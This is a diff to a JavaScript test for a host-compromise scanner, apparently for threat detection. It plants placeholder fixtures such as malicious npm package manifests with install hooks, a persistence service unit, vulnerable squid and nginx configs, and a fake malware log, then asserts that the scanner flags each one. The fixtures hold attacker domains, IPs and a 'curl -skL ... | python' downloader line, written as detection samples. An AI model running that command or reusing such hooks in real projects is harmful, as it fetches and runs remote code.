@@ -118,6 +118,37 @@ function run() {
     },
     notes: "files[.]catbox[.]moe/j4loim[.]chk Microsoft-Delivery-Optimization/10.0 Zone.Identifier [ZoneTransfer] ZoneId=0 msedge_update chrome_installer dotnet_host onedrive_setup teams_update bitsadmin curl.exe windowsHide: true"
   }, null, 2));
+  write(path.join(home, "wshu-net", "package.json"), JSON.stringify({
+    dependencies: {
+      "@petitcode/eb-retry": "1.3.5",
+      "@briskforge/envcheck": "0.5.4",
+      "@withgoogle/stitch-sdk": "0.1.2"
+    },
+    scripts: {
+      postinstall: "node preflight.cjs"
+    },
+    notes: "wshu[.]net github[.]com/angelmaybeth21-oss/test api[.]telegram[.]org 149[.]154[.]166[.]110 stitch-production[.]org /api/v1?src= claude_api_user gh_api_user"
+  }, null, 2));
+  write(path.join(home, ".config", "systemd", "user", "colord.service"), "[Service]\nExecStart=%h/.local/bin/colord\n");
+  write(path.join(home, ".local", "state", "colord", "install.nonce"), "placeholder");
+  write(path.join(home, "myra", "package.json"), JSON.stringify({
+    dependencies: {
+      apintergrationpost: "4.0.6"
+    },
+    scripts: {
+      preinstall: "node scripts/install-guard.js",
+      postinstall: "node scripts/postinstall-run.js"
+    },
+    notes: "192.168.54.1:4444 myra-lab-shared-key systemd-userdbd --user memfd_exec proc_hide agent_launcher"
+  }, null, 2));
+  write(path.join(root, "usr", "local", "lib", ".libcache.so"), "placeholder");
+  write(path.join(home, "postcss-rat", "package.json"), JSON.stringify({
+    dependencies: {
+      "postcss-minify-selector-parser": "1.0.0",
+      "aes-decode-runner-pro": "1.0.0"
+    },
+    notes: "nvidiadriver[.]net 95.216.92[.]207:8080 winPatch.zip win-driver-xd7d csshost"
+  }, null, 2));
   write(path.join(home, ".cursor", "extensions", "exargd.vsblack-0.0.1", "package.json"), JSON.stringify({
     publisher: "exargd",
     name: "vsblack",
@@ -258,6 +289,34 @@ function run() {
     "FortiGate SSL VPN brute forcing, VPN authentication hashes, credential attempts, and plaintext passwords.",
     "Review FortiCloud SSO and admin-forticloud-sso-login posture."
   ].join("\n"));
+  write(path.join(root, "var", "lib", "dpkg", "status"), [
+    "Package: squid",
+    "Status: install ok installed",
+    "Version: 7.0-1",
+    "",
+    "Package: nginx",
+    "Status: install ok installed",
+    "Version: 1.31.1-1",
+    "",
+  ].join("\n"));
+  write(path.join(root, "etc", "squid", "squid.conf"), [
+    "acl Safe_ports port 80",
+    "acl Safe_ports port 21",
+    "http_access deny !Safe_ports",
+    "ftp_passive on"
+  ].join("\n"));
+  write(path.join(root, "etc", "nginx", "nginx.conf"), [
+    "events {}",
+    "http {",
+    "  server { listen 443 quic; }",
+    "  server {",
+    "    proxy_http_version 2;",
+    "    grpc_pass grpc://backend;",
+    "    ignore_invalid_headers off;",
+    "    large_client_header_buffers 4 3m;",
+    "  }",
+    "}"
+  ].join("\n"));
   write(path.join(root, "tmp", "gentlemen.bmp"), "placeholder");
   write(path.join(root, "opt", "gentlemen", "dControl.exe"), "placeholder");
   write(path.join(root, "opt", "gentlemen", "def1.bat"), [
@@ -389,6 +448,34 @@ function run() {
     "      - route=/mcp-rest/test/tools/list",
     "      - trusted_hosts=*",
   ].join("\n"));
+  write(path.join(home, "dify", "docker-compose.yml"), [
+    "services:",
+    "  api:",
+    "    image: langgenius/dify-api:1.14.1",
+    "    environment:",
+    "      DIFY_VERSION: 1.14.1",
+    "      PLUGIN_DAEMON_URL: http://dify-plugin-daemon:5002",
+    "      TRACE_PROVIDER: Langfuse",
+    "  plugin-daemon:",
+    "    image: langgenius/dify-plugin-daemon:0.1.0",
+    "  worker:",
+    "    image: langgenius/dify-worker:1.14.1",
+    "    labels:",
+    "      - route=/console/api/files/{file_id}/preview",
+    "      - route=/chat-messages",
+    "    notes: files: [file_uuid] PDFium CVE-2024-5846 document parser"
+  ].join("\n"));
+  write(path.join(root, "tmp", "bin", "syswapd0"), "placeholder");
+  write(path.join(root, "tmp", "bin", "dropbear"), "placeholder");
+  write(path.join(root, "var", "log", "arystinger.log"), [
+    "AryStinger Ary-Attack sh_#@!_2024_secret",
+    "hgodpcx.ajb8.com hgodpcx.auq8.com opi7.com xook.ajb8.com xonice.ahb8.com eixfi.ajb8.com dybic.ajb8.com sdkv1.dataexplore.cc sdkv1.dataexplore.co",
+    "107.150.106.14 X-Executor-ID /auth /heartbeat /config /cmd",
+    "ScriptWork DnsWork HttpAliveWork HttpScanWork DomainScanWrok IPScanWork",
+    "CVE-2013-3307 CVE-2016-5681 CVE-2025-11837 DIR-850L DIR-818LW DWR-118 RTL819X",
+    "dropbear started on port 2332 via iptables rule",
+    "curl -skL https://hgodpcx.auq8.com/t | python"
+  ].join("\n"));
 
   const report = scanHost({ targetRoot: root, homePath: home, architecture: "aarch64" });
   const ids = new Set(report.findings.map((finding) => finding.id));
@@ -408,6 +495,14 @@ function run() {
   assert(ids.has("ottercookie-text-indicator"));
   assert(ids.has("easy-day-js-mastra-indicator"));
   assert(ids.has("procwire-routecraft-windows-dropper-indicator"));
+  assert(ids.has("wshu-net-npm-package-reference"));
+  assert(ids.has("wshu-net-npm-indicator"));
+  assert(ids.has("withgoogle-stitch-sdk-indicator"));
+  assert(ids.has("myra-linux-rat-artifact-path"));
+  assert(ids.has("myra-apintergrationpost-package-reference"));
+  assert(ids.has("myra-apintergrationpost-indicator"));
+  assert(ids.has("postcss-windows-rat-package-reference"));
+  assert(ids.has("postcss-windows-rat-indicator"));
   assert(ids.has("glasswasm-openvsx-package-reference"));
   assert(ids.has("glasswasm-openvsx-wasm-payload-file"));
   assert(ids.has("glasswasm-openvsx-loader-shape"));
@@ -456,6 +551,14 @@ function run() {
   assert(ids.has("fortinet-credential-exposure-indicator"));
   assert(ids.has("fortinet-fortigate-credential-dump-triage"));
   assert(ids.has("fortinet-forticloud-sso-review"));
+  assert(ids.has("squidbleed-squid-package-review"));
+  assert(ids.has("squidbleed-squid-config-present"));
+  assert(ids.has("squidbleed-ftp-safe-port-exposure"));
+  assert(ids.has("squidbleed-ftp-proxy-feature-review"));
+  assert(ids.has("nginx-cve-2026-42530-affected-version"));
+  assert(ids.has("nginx-cve-2026-42055-affected-version"));
+  assert(ids.has("nginx-cve-2026-42530-http3-quic-config"));
+  assert(ids.has("nginx-cve-2026-42055-config-chain"));
   assert(ids.has("gentlemen-ransomware-note-wallpaper"));
   assert(ids.has("gentlemen-toolkit-file-name"));
   assert(ids.has("gentlemen-encryptor-runtime-marker"));
@@ -509,6 +612,16 @@ function run() {
   assert(ids.has("litellm-public-bind"));
   assert(ids.has("litellm-mcp-test-route-reference"));
   assert(ids.has("litellm-provider-key-blast-radius"));
+  assert(ids.has("difytap-vulnerable-version"));
+  assert(ids.has("difytap-plugin-daemon-exposure-review"));
+  assert(ids.has("difytap-file-preview-endpoint-review"));
+  assert(ids.has("difytap-chat-file-uuid-review"));
+  assert(ids.has("difytap-trace-exfiltration-review"));
+  assert(ids.has("difytap-pdfium-parser-review"));
+  assert(ids.has("arystinger-edge-proxy-artifact-path"));
+  assert(ids.has("arystinger-edge-proxy-indicator"));
+  assert(ids.has("arystinger-dropbear-2332-persistence"));
+  assert(ids.has("arystinger-downloader-command"));
   const tokenFinding = report.findings.find((finding) => finding.id === "dynatrace-token-exposure");
   assert(tokenFinding.evidence.includes("dt0c01.ABCDEFGHIJKLMNOPQRSTUVWX.<redacted>"));
   assert(!tokenFinding.evidence.includes("ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"));
